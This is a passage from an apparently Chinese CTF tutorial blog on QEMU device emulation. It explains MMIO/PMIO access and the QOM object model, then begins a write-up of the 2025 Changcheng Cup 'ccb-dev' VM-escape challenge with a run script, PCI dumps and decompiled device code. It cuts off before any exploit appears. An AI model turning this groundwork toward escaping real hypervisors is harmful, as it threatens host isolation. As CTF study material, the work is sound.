class="string">&quot;my_device&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> -EBUSY;  <span class="comment">// 资源已被占用</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 映射物理地址</span></span><br><span class="line">addr = <span class="built_in">ioremap</span>(ioaddr, iomemsize);</span><br><span class="line"><span class="keyword">if</span> (!addr) &#123;</span><br><span class="line">    <span class="built_in">release_mem_region</span>(ioaddr, iomemsize);</span><br><span class="line">    <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 读写操作</span></span><br><span class="line">val = <span class="built_in">readl</span>(addr);          <span class="comment">// 读取 32 位</span></span><br><span class="line"><span class="built_in">writel</span>(val + <span class="number">1</span>, addr);      <span class="comment">// 写入 32 位</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 清理</span></span><br><span class="line"><span class="built_in">iounmap</span>(addr);</span><br><span class="line"><span class="built_in">release_mem_region</span>(ioaddr, iomemsize);</span><br></pre></td></tr></table></figure>

<p>还有一种方式是在用户态访问mmio空间，通过映射<code>resource0</code>文件实现内存的访问，示例代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    *((<span class="type">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem @ %p\n&quot;</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    mmio_read(<span class="number">0x128</span>);</span><br><span class="line">        mmio_write(<span class="number">0x128</span>, <span class="number">1337</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="访问pmio"><a href="#访问pmio" class="headerlink" title="访问pmio"></a>访问pmio</h3><p>编译内核模块，在内核空间访问pmio空间，示例代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/io.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/ioport.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">inb(port);  <span class="comment">//读取一字节</span></span><br><span class="line">inw(port);  <span class="comment">//读取两字节</span></span><br><span class="line">inl(port);  <span class="comment">//读取四字节</span></span><br><span class="line"></span><br><span class="line">outb(val,port); <span class="comment">//写一字节</span></span><br><span class="line">outw(val,port); <span class="comment">//写两字节</span></span><br><span class="line">outl(val,port); <span class="comment">//写四字节</span></span><br></pre></td></tr></table></figure>

<p>用户空间访问则需要先调用<code>iopl</code>函数申请访问端口，示例代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h &gt;</span></span></span><br><span class="line"></span><br><span class="line">iopl(<span class="number">3</span>); </span><br><span class="line">inb(port); </span><br><span class="line">inw(port); </span><br><span class="line">inl(port);</span><br><span class="line"></span><br><span class="line">outb(val,port); </span><br><span class="line">outw(val,port); </span><br><span class="line">outl(val,port);</span><br></pre></td></tr></table></figure>

<p>有一点要注意的是在访问pmio的时候，是直接通过I&#x2F;O port写入和读取资源的，因此要事先声明port归属，不然有可能会导致冲突，pmio常见用于x86平台上，适用于传统的设备，如：串口，键盘等等</p>
<table>
<thead>
<tr>
<th align="left"><strong>特性</strong></th>
<th align="left"><strong>MMIO（ioremap + readl&#x2F;writel）</strong></th>
<th align="left"><strong>PMIO（inb&#x2F;outb）</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>访问方式</strong></td>
<td align="left">内存映射（直接访问物理内存）</td>
<td align="left">I&#x2F;O 端口（x86 <code>in</code>&#x2F;<code>out</code> 指令）</td>
</tr>
<tr>
<td align="left"><strong>适用架构</strong></td>
<td align="left">所有架构（x86&#x2F;ARM&#x2F;RISC-V）</td>
<td align="left">主要是 x86</td>
</tr>
<tr>
<td align="left"><strong>地址范围</strong></td>
<td align="left">32&#x2F;64 位物理地址</td>
<td align="left">16 位端口地址（0x0000–0xFFFF）</td>
</tr>
<tr>
<td align="left"><strong>性能</strong></td>
<td align="left">通常更快（内存访问优化）</td>
<td align="left">较慢（需要 CPU I&#x2F;O 指令）</td>
</tr>
<tr>
<td align="left"><strong>典型设备</strong></td>
<td align="left">PCIe 设备、GPU、网卡</td>
<td align="left">传统 ISA 设备（串口、PS&#x2F;2）</td>
</tr>
</tbody></table>
<h2 id="QOM编程模型"><a href="#QOM编程模型" class="headerlink" title="QOM编程模型"></a>QOM编程模型</h2><p><code>QEMU</code>提供了一套面向对象编程的模型——<code>QOM</code>（<code>QEMU Object Module</code>），几乎所有的设备如CPU、内存、总线等都是利用这一面向对象的模型来实现的。</p>
<p>由于<code>qemu</code>模拟设备以及CPU等，既有相应的共性又有自己的特性，因此使用面向对象来实现相应的程序是非常高效的，可以像理解<code>C++</code>或其它面向对象语言来理解<code>QOM</code>。</p>
<p>有几个比较关键的结构体，<code>TypeInfo</code>、<code>TypeImpl</code>、<code>ObjectClass</code>以及<code>Object</code>。其中<code>ObjectClass</code>、<code>Object</code>、<code>TypeInfo</code>定义在<code>include/qom/object.h</code>中，<code>TypeImpl</code>定义在<code>qom/object.c中</code>。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">TypeInfo</span> &#123;</span><br><span class="line">    <span class="comment">/* 类型标识 */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;          <span class="comment">// 类型名称（唯一标识符，如 &quot;MyDevice&quot;）</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *parent;        <span class="comment">// 父类型名称（继承关系，NULL表示无父类）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 实例（对象）相关 */</span></span><br><span class="line">    <span class="type">size_t</span> instance_size;      <span class="comment">// 实例的内存大小（sizeof(MyObject)）</span></span><br><span class="line">    <span class="built_in">void</span> (*instance_init)(Object *obj);        <span class="comment">// 实例构造函数（初始化成员变量）</span></span><br><span class="line">    <span class="built_in">void</span> (*instance_post_init)(Object *obj);   <span class="comment">// 实例后置初始化（依赖注入等）</span></span><br><span class="line">    <span class="built_in">void</span> (*instance_finalize)(Object *obj);    <span class="comment">// 实例析构函数（资源释放）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 类（元类型）相关 */</span></span><br><span class="line">    <span class="type">bool</span> abstract;             <span class="comment">// 是否为抽象类型（不可直接实例化）</span></span><br><span class="line">    <span class="type">size_t</span> class_size;         <span class="comment">// 类结构体大小（sizeof(MyClass)）</span></span><br><span class="line">    <span class="built_in">void</span> (*class_init)(ObjectClass *klass, <span class="type">void</span> *data);      <span class="comment">// 类构造函数（初始化静态方法）</span></span><br><span class="line">    <span class="built_in">void</span> (*class_base_init)(ObjectClass *klass, <span class="type">void</span> *data); <span class="comment">// 父类初始化回调</span></span><br><span class="line">    <span class="built_in">void</span> (*class_finalize)(ObjectClass *klass, <span class="type">void</span> *data);   <span class="comment">// 类析构函数（清理静态资源）</span></span><br><span class="line">    <span class="type">void</span> *class_data;          <span class="comment">// 类级别的自定义数据（可选）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 接口支持（多继承） */</span></span><br><span class="line">    InterfaceInfo *interfaces; <span class="comment">// 实现的接口列表（如 [Serializable, Drawable]）</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>TypeImpl</code>的属性与<code>TypeInfo</code>的属性对应，实际上<code>qemu</code>就是通过用户提供的<code>TypeInfo</code>创建的<code>TypeImpl</code>的对象。</p>
<p>如下面定义的<code>pci_test_dev</code>：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo pci_testdev_info = &#123;</span><br><span class="line">    .name          = TYPE_PCI_TEST_DEV,       <span class="comment">// 类型名称（唯一标识）</span></span><br><span class="line">    .parent        = TYPE_PCI_DEVICE,         <span class="comment">// 父类型（继承自PCI设备）</span></span><br><span class="line">    .instance_size = <span class="built_in">sizeof</span>(PCITestDevState), <span class="comment">// 实例内存大小</span></span><br><span class="line">    .class_init    = pci_testdev_class_init,  <span class="comment">// 类初始化函数</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">TypeImpl *<span class="title">type_register_static</span><span class="params">(<span class="type">const</span> TypeInfo *info)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">type_register</span>(info);  <span class="comment">// 直接调用动态注册函数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">TypeImpl *<span class="title">type_register</span><span class="params">(<span class="type">const</span> TypeInfo *info)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">assert</span>(info-&gt;parent);  <span class="comment">// 必须指定父类型（强制单继承）</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">type_register_internal</span>(info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> TypeImpl *<span class="title">type_register_internal</span><span class="params">(<span class="type">const</span> TypeInfo *info)</span> </span>&#123;</span><br><span class="line">    TypeImpl *ti;</span><br><span class="line">    ti = <span class="built_in">type_new</span>(info);      <span class="comment">// 创建类型对象（TypeImpl）</span></span><br><span class="line">    <span class="built_in">type_table_add</span>(ti);       <span class="comment">// 将类型添加到全局类型表</span></span><br><span class="line">    <span class="keyword">return</span> ti;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当所有<code>qemu</code>总线、设备等的<code>type_register_static</code>执行完成后，即它们的<code>TypeImpl</code>实例创建成功后，qemu就会在<code>type_initialize</code>函数中去实例化其对应的<code>ObjectClasses</code>。</p>
<p>每个<code>type</code>都有一个相应的<code>ObjectClass</code>所对应，其中<code>ObjectClass</code>是所有类的基类</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">ObjectClass</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span>  <span class="comment">// 表示以下字段为内部实现细节，外部不应直接访问</span></span><br><span class="line">    Type type;                  <span class="comment">// 指向该类的TypeImpl对象，包含类型名称、父类、实例大小等元信息</span></span><br><span class="line">    GSList *interfaces;         <span class="comment">// 该类实现的所有接口（GSList链表结构，支持多接口继承）</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *object_cast_cache[OBJECT_CLASS_CAST_CACHE];  <span class="comment">// 缓存对象类型转换结果（如object_dynamic_cast）</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *class_cast_cache[OBJECT_CLASS_CAST_CACHE];   <span class="comment">// 缓存类类型转换结果（如class_dynamic_cast）</span></span><br><span class="line">    </span><br><span class="line">    ObjectUnparent *unparent;   <span class="comment">// 当对象从父对象中移除时调用的回调函数</span></span><br><span class="line">    GHashTable *properties;     <span class="comment">// 类的静态属性表（存储通过class_property_add()添加的属性定义）</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>type</code>是连接<code>ObjectClass</code>和<code>TypeImpl</code>对象的桥梁</p>
<p>用户可以定义自己的类，继承相应类即可：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* include/qom/object.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">TypeImpl</span> *Type;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">ObjectClass</span> ObjectClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ObjectClass</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        Type type;       <span class="comment">/* points to the current Type&#x27;s instance */</span></span><br><span class="line">        ...</span><br><span class="line">            </span><br><span class="line"><span class="comment">/* include/hw/qdev-core.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">DeviceClass</span> &#123;</span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        ObjectClass parent_class;</span><br><span class="line">        <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line">        ...</span><br><span class="line">            </span><br><span class="line"><span class="comment">/* include/hw/pci/pci.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">PCIDeviceClass</span> &#123;</span><br><span class="line">        DeviceClass parent_class;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<p>可以看到类的定义中<strong>父类都在第一个字段</strong>，使得可以父类与子类<strong>直接实现转换</strong>。一个类初始化时会先初始化它的父类，父类初始化完成后，会将相应的字段拷贝至子类同时将子类其余字段赋值为0，再进一步赋值。同时也会<strong>继承父类相应的虚函数指针</strong>，当所有的父类都<strong>初始化结束后</strong>，<code>TypeInfo::class_init</code>就会<strong>调用</strong>以实现虚函数的初始化，如下例的pci_testdev_class_init所示：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">pci_testdev_class_init</span><span class="params">(ObjectClass *klass, <span class="type">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        DeviceClass *dc = <span class="built_in">DEVICE_CLASS</span>(klass);</span><br><span class="line">        PCIDeviceClass *k = <span class="built_in">PCI_DEVICE_CLASS</span>(klass);</span><br><span class="line">        k-&gt;init = pci_testdev_init;</span><br><span class="line">        k-&gt;exit = pci_testdev_uninit;</span><br><span class="line">        ...</span><br><span class="line">        dc-&gt;desc = <span class="string">&quot;PCI Test Device&quot;</span>;</span><br><span class="line">        ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="2025长城杯决赛-ccb-dev"><a href="#2025长城杯决赛-ccb-dev" class="headerlink" title="2025长城杯决赛  ccb-dev"></a>2025长城杯决赛  ccb-dev</h2><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@<span class="number">97b</span>480f126b2:/home/ctf<span class="meta"># cat run.sh \n</span></span><br><span class="line">#!/bin/sh</span><br><span class="line">./qemu-system-x86_64 \</span><br><span class="line">    -m <span class="number">512</span>M \</span><br><span class="line">    -kernel ./vmlinuz \</span><br><span class="line">    -initrd  ./core.cpio \</span><br><span class="line">    -L pc-bios \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rdinit=/sbin/init console=ttyS0 oops=panic panic=1 loglevel=3 quiet kaslr&quot;</span> \</span><br><span class="line">    -cpu kvm64,+smep \</span><br><span class="line">    -smp cores=<span class="number">2</span>,threads=<span class="number">1</span> \</span><br><span class="line">    -device ccb-dev-pci \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure>

<p>看到qemu的启动脚本，有个<code>-device ccb-dev-pci</code>：加载一个 <strong>自定义 PCI 设备</strong></p>
<p>可以猜测漏洞就在这个pci上，看pci的详细信息</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="meta"># lspci -v</span></span><br><span class="line"><span class="number">00</span>:<span class="number">01.0</span> Class <span class="number">0601</span>: <span class="number">8086</span>:<span class="number">7000</span></span><br><span class="line"><span class="number">00</span>:<span class="number">04.0</span> Class <span class="number">00f</span>f: <span class="number">1234</span>:<span class="number">1337</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00.0</span> Class <span class="number">0600</span>: <span class="number">8086</span>:<span class="number">1237</span></span><br><span class="line"><span class="number">00</span>:<span class="number">01.3</span> Class <span class="number">0680</span>: <span class="number">8086</span>:<span class="number">7113</span></span><br><span class="line"><span class="number">00</span>:<span class="number">03.0</span> Class <span class="number">0200</span>: <span class="number">8086</span>:<span class="number">100</span>e</span><br><span class="line"><span class="number">00</span>:<span class="number">01.1</span> Class <span class="number">0101</span>: <span class="number">8086</span>:<span class="number">7010</span></span><br><span class="line"><span class="number">00</span>:<span class="number">02.0</span> Class <span class="number">0300</span>: <span class="number">1234</span>:<span class="number">1111</span></span><br></pre></td></tr></table></figure>

<p>可以看到有两个非标准的厂商和设备id，1234:1337更像是ccb_dev的pci</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/sys/devices/pci0000:<span class="number">00</span>/<span class="number">0000</span>:<span class="number">00</span>:<span class="number">04.0</span> <span class="meta"># hexdump config</span></span><br><span class="line"><span class="number">0000000</span> <span class="number">1234</span> <span class="number">1337</span> <span class="number">0103</span> <span class="number">0000</span> <span class="number">0081</span> <span class="number">00f</span>f <span class="number">0000</span> <span class="number">0000</span></span><br><span class="line"><span class="number">0000010</span> <span class="number">1000</span> febf <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span></span><br><span class="line"><span class="number">0000020</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">1</span>af4 <span class="number">1100</span></span><br><span class="line"><span class="number">0000030</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span></span><br><span class="line">*</span><br><span class="line"><span class="number">0000100</span></span><br></pre></td></tr></table></figure>

<p>这里有个BAR0是MMIO</p>
<p>逆向<code>qemu</code>：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">ccb_dev_class_init</span><span class="params">(ObjectClass *oc, <span class="type">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  DeviceClass *dc; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  PCIDeviceClass *pci; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  dc = (DeviceClass *)<span class="built_in">object_class_dynamic_cast_assert</span>(</span><br><span class="line">                        oc,</span><br><span class="line">                        <span class="string">&quot;device&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;/worksapce/qemu-3.1.0/hw/misc/ccb-dev.c&quot;</span>,</span><br><span class="line">                        <span class="number">146</span>,</span><br><span class="line">                        <span class="string">&quot;ccb_dev_class_init&quot;</span>);</span><br><span class="line">  pci = (PCIDeviceClass *)<span class="built_in">object_class_dynamic_cast_assert</span>(</span><br><span class="line">                            oc,</span><br><span class="line">                            <span class="string">&quot;pci-device&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;/worksapce/qemu-3.1.0/hw/misc/ccb-dev.c&quot;</span>,</span><br><span class="line">                            <span class="number">147</span>,</span><br><span class="line">                            <span class="string">&quot;ccb_dev_class_init&quot;</span>);</span><br><span class="line">  pci-&gt;realize = (<span class="built_in">void</span> (*)(PCIDevice *, Error **))ccb_dev_realize;</span><br><span class="line">  pci-&gt;vendor_id = <span class="number">4660</span>;</span><br><span class="line">  pci-&gt;device_id = <span class="number">4919</span>;</span><br><span class="line">  pci-&gt;revision = <span class="number">-127</span>;</span><br><span class="line">  pci-&gt;class_id = <span class="number">255</span>;</span><br><span class="line">  dc-&gt;desc = <span class="string">&quot;arttnba3 test PCI device&quot;</span>;</span><br><span class="line">  <span class="built_in">set_bit_68</span>(<span class="number">7LL</span>, dc-&gt;categories);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大致的作用：</p>
<ul>
<li>确保当前设备类继承自 QEMU 的通用设备基类 和 确保当前设备类是一个 PCI 设备。</li>
<li><code>realize</code> 是 QEMU 设备初始化的关键回调，在设备实例化时被调用</li>
<li>配置 PCI 设备的厂商 ID、设备 ID、版本号和类代码。</li>
<li>然后 设置设备的描述字符串。</li>
<li>最后设置 类别掩码 对 设备进行分类，掩码为7</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">ccb_dev_realize</span><span class="params">(PCIDevice *pci_dev, Error **errp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  CCBPCIDevState *ds_0; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  ds_0 = (CCBPCIDevState *)<span class="built_in">object_dynamic_cast_assert</span>(</span><br><span class="line">                             &amp;pci_dev-&gt;qdev.parent_obj,</span><br><span class="line">                             <span class="string">&quot;ccb-dev-pci&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;/worksapce/qemu-3.1.0/hw/misc/ccb-dev.c&quot;</span>,</span><br><span class="line">                             <span class="number">123</span>,</span><br><span class="line">                             <span class="string">&quot;ccb_dev_realize&quot;</span>);</span><br><span class="line">  <span class="built_in">memory_region_init_io</span>(</span><br><span class="line">    &amp;ds_0-&gt;mmio,</span><br><span class="line">    &amp;ds_0-&gt;parent_obj.qdev.parent_obj,</span><br><span class="line">    &amp;ccb_dev_mmio_ops,</span><br><span class="line">    pci_dev,</span><br><span class="line">    <span 